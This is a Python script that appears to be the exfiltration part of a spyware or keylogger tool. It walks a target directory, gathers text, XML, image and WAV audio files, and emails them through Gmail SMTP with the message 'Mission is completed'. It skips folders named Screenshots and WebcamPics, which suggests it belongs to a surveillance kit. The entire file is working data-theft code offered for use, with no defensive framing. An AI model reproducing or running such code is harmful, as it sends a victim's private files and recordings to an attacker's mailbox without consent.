import os
import smtplib
import re
import mimetypes
from dotenv import load_dotenv
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Load environment variables
dotenv_path = r"E:\KALEZ\2 2\NPS\PROJECT\cred.env"
load_dotenv(dotenv_path)

EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")

if not EMAIL_ADDRESS or not EMAIL_PASSWORD:
    raise ValueError("Email credentials not found. Check your .env file.")

def email_base(msg, sender_email):
    msg["From"] = sender_email
    msg["To"] = sender_email
    msg["Subject"] = "Success!!!"
    body = "Mission is completed"
    msg.attach(MIMEText(body, "plain"))
    return msg

def smtp_handler(email_address, password, msg):
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as s:
            s.starttls()
            s.login(email_address, password)
            s.sendmail(email_address, email_address, msg.as_string())
    except Exception as e:
        print(f"Error sending email: {e}")

def attach_file(msg, file_path):
    """Attach a file to the email."""
    try:
        with open(file_path, "rb") as attachment:
            p = MIMEBase("application", "octet-stream")
            p.set_payload(attachment.read())

        encoders.encode_base64(p)
        p.add_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
        msg.attach(p)
    except Exception as e:
        print(f"Error attaching {file_path}: {e}")

def send_email(path):
    regex_patterns = [r".+\.xml$", r".+\.txt$", r".+\.png$", r".+\.jpg$"]
    wav_pattern = re.compile(r".+\.wav$")
    
    exclude_dirs = {"Screenshots", "WebcamPics"}
    
    msg = MIMEMultipart()
    email_base(msg, EMAIL_ADDRESS)

    for dirpath, dirnames, filenames in os.walk(path, topdown=True):
        dirnames[:] = [d for d in dirnames if d not in exclude_dirs]

        for file in filenames:
            file_path = os.path.join(dirpath, file)

            if any(re.match(pattern, file) for pattern in regex_patterns):
                attach_file(msg, file_path)
            elif wav_pattern.match(file):
                # Send WAV files separately
                msg_alt = MIMEMultipart()
                email_base(msg_alt, EMAIL_ADDRESS)
                attach_file(msg_alt, file_path)
                smtp_handler(EMAIL_ADDRESS, EMAIL_PASSWORD, msg_alt)

    # Send non-WAV files
    smtp_handler(EMAIL_ADDRESS, EMAIL_PASSWORD, msg)

if __name__ == "__main__":
    directory_to_scan = "C:\\path\\to\\your\\directory"  # Change this to your target folder
    send_email(directory_to_scan)
